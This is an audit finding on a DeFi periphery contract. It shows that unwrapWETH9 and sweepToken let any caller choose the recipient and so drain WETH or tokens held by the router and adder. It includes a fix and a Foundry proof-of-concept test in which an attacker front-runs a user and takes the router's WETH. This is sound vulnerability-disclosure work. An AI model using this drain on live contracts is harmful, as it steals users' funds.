Audit Report

## Title
Unguarded `unwrapWETH9` and `sweepToken` with arbitrary `recipient` allow theft of router/adder token balances — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

## Summary

`PeripheryPayments.unwrapWETH9` and `sweepToken` are `public payable` with no caller restriction and accept a fully attacker-controlled `recipient` address. Both `MetricOmmSimpleRouter` and `MetricOmmPoolLiquidityAdder` inherit this contract. Any WETH or ERC-20 balance that lands on either contract — including WETH explicitly routed there by a user executing the ETH-output swap pattern — can be drained by an unprivileged attacker in a separate transaction before the user's follow-up call.

## Finding Description

`PeripheryPayments.unwrapWETH9` (L37–45) and `sweepToken` (L48–55) are declared `public payable` with no `msg.sender` restriction and accept a caller-supplied `recipient`:

```solidity
function unwrapWETH9(uint256 amountMinimum, address recipient) public payable override {
    uint256 balanceWETH = IERC20(WETH).balanceOf(address(this));
    if (balanceWETH < amountMinimum) revert InsufficientWETH(amountMinimum, balanceWETH);
    if (balanceWETH > 0) {
        IWETH9(WETH).withdraw(balanceWETH);
        _transferETH(recipient, balanceWETH);   // ← arbitrary recipient
    }
}
```

By contrast, `refundETH` (L58–63) correctly hardcodes `msg.sender` as the recipient, demonstrating the safe pattern exists in the same file but was not applied to the other two functions.

`MetricOmmSimpleRouter` inherits `PeripheryPayments` and exposes both functions to any external caller. The ETH-output swap pattern — explicitly tested in `test_multicall_tokenForWeth_thenUnwrapEth` — routes WETH to `address(router)` as an intermediate holder:

```solidity
recipient: address(router),   // WETH lands on router
```

followed by `unwrapWETH9` to convert and forward ETH to the user. The test bundles both steps atomically via `multicall`, but both functions are individually callable. A user who executes the two steps as separate transactions leaves WETH stranded on the router between them. An attacker watching the mempool can call `router.unwrapWETH9(0, attacker)` — with `amountMinimum = 0` making the check unconditional — and drain the full WETH balance before the user's second transaction lands.

`MetricOmmPoolLiquidityAdder` similarly inherits `PeripheryPayments`, exposing `sweepToken` to any caller for any ERC-20 balance that lands on the adder.

## Impact Explanation

Direct, complete loss of user principal. The attacker receives 100% of the WETH output from the victim's swap (or ERC-20 balance on the adder) with zero capital requirement. The victim's `unwrapWETH9` call then finds a zero balance and transfers nothing. This is a Critical/High direct loss of user funds meeting Sherlock thresholds.

## Likelihood Explanation

The ETH-output two-step pattern (swap with `recipient=address(router)`, then `unwrapWETH9`) is the documented and tested usage pattern for native ETH output. Any user who does not bundle both steps into a single `multicall` is vulnerable. A mempool-watching attacker needs no special privilege, no capital, and no setup — a single call with `amountMinimum = 0` and `recipient = attacker` suffices. The attack is repeatable for every such user transaction.

## Recommendation

Restrict `sweepToken` and `unwrapWETH9` so that `recipient` is always `msg.sender`, mirroring the safe design of `refundETH`:

```solidity
function unwrapWETH9(uint256 amountMinimum) public payable override {
    uint256 balanceWETH = IERC20(WETH).balanceOf(address(this));
    if (balanceWETH < amountMinimum) revert InsufficientWETH(amountMinimum, balanceWETH);
    if (balanceWETH > 0) {
        IWETH9(WETH).withdraw(balanceWETH);
        _transferETH(msg.sender, balanceWETH);
    }
}

function sweepToken(address token, uint256 amountMinimum) public payable override {
    uint256 balanceToken = IERC20(token).balanceOf(address(this));
    if (balanceToken < amountMinimum) revert InsufficientToken(token, amountMinimum, balanceToken);
    if (balanceToken > 0) {
        IERC20(token).safeTransfer(msg.sender, balanceToken);
    }
}
```

This preserves `multicall` composability because `multicall` uses `delegatecall`, so `msg.sender` inside each sub-call is the original transaction sender.

## Proof of Concept

```solidity
function test_attacker_steals_weth_from_router() public {
    uint128 amountIn = 3_000;

    // Step 1: legitimate user swaps token1 → WETH, routing output to router
    vm.prank(swapper);
    router.exactInputSingle(
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: address(pool),
            tokenIn: address(token1),
            tokenOut: address(weth),
            zeroForOne: false,
            amountIn: amountIn,
            amountOutMinimum: 0,
            recipient: address(router),   // WETH lands on router
            deadline: block.timestamp + 1,
            priceLimitX64: type(uint128).max,
            extensionData: ""
        })
    );

    uint256 routerWeth = weth.balanceOf(address(router));
    assertGt(routerWeth, 0, "weth on router");

    // Step 2: attacker front-runs the user's unwrapWETH9 call
    address attacker = address(0xBEEF);
    vm.prank(attacker);
    router.unwrapWETH9(0, attacker);   // amountMinimum=0, recipient=attacker

    assertEq(attacker.balance, routerWeth, "attacker stole weth");
    assertEq(weth.balanceOf(address(router)), 0, "router drained");
}
```
